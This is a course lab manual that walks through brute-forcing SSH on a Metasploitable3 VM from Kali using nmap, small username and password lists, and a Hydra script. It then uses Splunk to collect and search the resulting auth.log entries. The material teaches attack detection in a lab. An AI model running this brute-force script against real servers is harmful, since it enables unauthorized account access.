# ICS344 Project: SSH Attack and Splunk Analysis Manual

## Phase 1: SSH Brute Force via Script Method

### 1. Environment Setup

Set up the following machines using VirtualBox:

- **Kali Linux** (Attacker)
- **Metasploitable3** (Victim)

#### Network Setup for Both:

- Adapter 1: NAT Network (for internet access)
- Adapter 2: Host-Only Adapter (to allow communication between VMs)

---

### 2. Check VM Communication

- On **Kali**, run:

```bash
ifconfig
```

![Output should include an IP like `192.168.56.104`](screenshots/Kali_IP.png)

- On **Metasploitable3**, run:

```bash
ifconfig
```

- If the IP is not `192.168.x.x`, run:

```bash
sudo dhclient -r eth1
sudo dhclient eth1
ifconfig
```

![the new IP is `192.168.56.105`](screenshots/Meta_IP.png)

- Test connectivity:

```bash
ping 192.168.56.104 //in Metaspoiltable3
ping 192.168.56.105 //in Kali Linux

```

![VMs Connected](screenshots/Ping_on_Meta.png)
![VMs Connected](screenshots/Ping_on_Kali.png)

---

### 3. Discover Open Ports on the Victim

Run from Kali:

```bash
sudo nmap -sS -sV 192.168.56.105
```

![Output showing open services, including SSH port 22](screenshots/Open_Ports.png)

---

### 4. Prepare Files & Script (Without Running)

```bash
mkdir ssh-brute
cd ssh-brute
```

#### Create `users.txt`

```bash
nano users.txt
```

Paste:

```
pgsql
admin
root
user
vagrant
aisha
test
```

#### Create `pass.txt`

```bash
nano pass.txt
```

Paste:

```
nginx
password
123456
toor
vagrant
aishapass
testpass
```

#### Create `script.sh`

```bash
nano script.sh
```

Paste:

```bash
#!/bin/bash

TARGET_IP="192.168.56.105"
TARGET_PORT=22
USER_LIST="users.txt"
PASSWORD_LIST="pass.txt"
OUTPUT_FILE="valid_credentials.txt"

if ! command -v hydra &> /dev/null; then
    echo "Hydra is not installed. Please install it and try again."
    exit 1
fi

echo "Starting brute force attack with Hydra..."
hydra -L "$USER_LIST" -P "$PASSWORD_LIST" ssh://$TARGET_IP -s $TARGET_PORT -o $OUTPUT_FILE

if [ -s "$OUTPUT_FILE" ]; then
    echo "Brute force attack completed. Valid credentials found:"
    cat "$OUTPUT_FILE"
else
    echo "No valid credentials found."
fi
```

Make it executable:

```bash
chmod +x script.sh
```

---

## Phase 2: SIEM Log Analysis (Splunk)

### 1. Install Splunk Enterprise on Kali

```bash
wget -O splunk-9.3.2.deb https://download.splunk.com/products/splunk/releases/9.3.2/linux/splunk-9.3.2-d8bb32809498-linux-2.6-amd64.deb
sudo dpkg -i splunk-9.3.2.deb
sudo apt --fix-broken install
sudo /opt/splunk/bin/splunk start --accept-license
```

Open Splunk in browser: `http://localhost:8000`

![Splunk web interface main page](screenshots/Splunk_Main_Page.png)

### 2. Install Splunk Forwarder on Metasploitable3

```bash
wget -O splunkforwarder-9.4.1.deb "https://download.splunk.com/products/universalforwarder/releases/9.4.1/linux/splunkforwarder-9.4.1-e3bdab203ac8-linux-amd64.deb"
sudo dpkg -i splunkforwarder-9.4.1.deb
sudo apt --fix-broken install
sudo /opt/splunkforwarder/bin/splunk start --accept-license
```

### 3. Enable Receiving on Port 9997 in Splunk

- Go to **Settings > Forwarding and Receiving**
- Click **Add new receiving port** → enter `9997`

![port 9997 is enabled in Splunk](screenshots/Port_9997.png)

### 4. Connect Forwarder to Server

```bash
sudo /opt/splunkforwarder/bin/splunk add forward-server 192.168.56.104:9997
sudo /opt/splunkforwarder/bin/splunk restart
```

- Check the connection:

```bash
sudo /opt/splunkforwarder/bin/splunk list forward-server
```

![active forward to Splunk server IP and port](screenshots/Active.png)

### 5. Monitor SSH Log File

```bash
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log
```

![Log file successfully added to monitor list](screenshots/Log.png)

---

### 6. Run the Attack

Back on Kali:

```bash
cd ssh-brute
./script.sh
```

![Hydra results](screenshots/Atack.png)

---

### 7. Search Logs in Splunk

- Open: `http://localhost:8000`
- Go to **Search & Reporting** > **Data Summary > Hosts**
- Select: `metasploitable3`
- Go to **Sources** → `/var/log/auth.log`

#### Useful Searches:

- Failed logins:

```spl
index=* source="/var/log/auth.log" "Failed password"
```

![Logs showing failed login attempts](Failed/Atack.png)

- Successful logins:

```spl
index=* source="/var/log/auth.log" "Accepted password"
```

![Logs showing successful login (vagrant)](Succesed/Atack.png)

---

## Log Analysis (Detailed Explanation)

### Service: SSH (`sshd`)

- SSH was the main target of the brute-force attack.
- Hydra tested combinations from `users.txt` and `pass.txt`.

### Observed Log Behavior:

- Over 180 total SSH log entries collected during the test window.
- Consistent log pattern:
  - Failed: `Failed password for invalid user ___`
  - Success: `Accepted password for vagrant from 192.168.56.104 port 41862 ssh2`

### Timeline Analysis:

- The logs show a sequence of incorrect login attempts.
- At the end of the sequence, Splunk captured a successful login.
- The log clearly records the attack’s source IP and destination host.

#

---
